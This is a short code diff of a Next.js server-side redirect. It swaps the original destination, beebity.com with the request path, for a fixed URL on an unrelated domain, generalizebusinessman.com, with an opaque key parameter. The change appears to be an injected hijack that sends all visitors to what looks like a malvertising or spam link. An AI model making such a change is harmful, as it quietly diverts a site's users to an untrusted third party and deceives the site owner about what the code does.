@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://beebity.com/` + encodeURI(path as string)
+					`https://generalizebusinessman.com/ptj48jfss?key=5885334b10942dc6d6b3999661aeccfa/`
 				}`,
 			},
 		};
